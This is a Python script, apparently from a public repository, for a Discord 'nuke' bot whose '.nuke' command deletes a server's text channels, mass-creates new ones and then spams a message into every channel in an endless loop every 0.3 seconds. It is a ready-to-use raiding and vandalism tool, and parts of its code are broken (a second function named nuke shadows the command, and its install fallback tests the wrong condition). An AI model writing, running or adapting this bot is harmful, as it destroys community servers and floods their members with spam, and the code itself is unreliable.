import os
import data
from data import DeleteAllChannels, channelName, AmountOfchannels, NukeMessage
try:
    import discord
    from discord.ext import commands
    import asyncio
except ImportError:
    missing_modules = []
    if not os.system("python -c 'import discord'"):
        missing_modules.append("discord")
    if not os.system("python -c 'import asyncio'"):
        missing_modules.append("asyncio")
    if missing_modules:
        for module in missing_modules:
            os.system(f"python -m pip install {module}")

var = """\t\t\t\t  _   _       _         ______       _   
\t\t\t\t | \ | |     | |        | ___ \     | |  
\t\t\t\t |  \| |_   _| | _____  | |_/ / ___ | |_ 
\t\t\t\t | . ` | | | | |/ / _ \ | ___ \/ _ \| __|
\t\t\t\t | |\  | |_| |   <  __/ | |_/ / (_) | |_ 
\t\t\t\t \_| \_/\__,_|_|\_\___| \____/ \___/ \__|
"""
var2 = """
  [I would appreciate it if you starred this reposit @ https://github.com/AJJazzy/Discord-Nuke-Bot] ●‿●
"""
print(var + var2)

TOKEN = "" #The Token associated with your discord bot. (Please change this. to whatever your token is)
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)
toggle = False

@bot.command()
async def nuke(ctx):
    global toggle
    if toggle == False:
        await ctx.message.delete()
        guild = ctx.message.guild
        channels = guild.text_channels
        if isinstance(DeleteAllChannels, int):
            delete_count = min(DeleteAllChannels, len(channels))
            coroutines2 = [channel.delete() for channel in channels[:delete_count]]
            await asyncio.gather(*coroutines2)
        print(" ")
        print("All Channels deleted!")
        print(" ")
        await asyncio.sleep(1)
        coroutines3 = [guild.create_text_channel(f"{channelName}") for i in range(AmountOfchannels)]
        await asyncio.gather(*coroutines3)
        print(" ")
        print(f" channels created!")
        print(" ")
        await asyncio.sleep(1)
        await nuke(ctx.message.guild)
    else:
        toggle = False

async def nuke(guild: discord.guild):
    global toggle
    toggle = True
    while toggle == True:
        channels = guild.text_channels
        coroutines = [channel.send(NukeMessage) for channel in channels]
        await asyncio.gather(*coroutines)
        await asyncio.sleep(0.30)

bot.run(TOKEN)
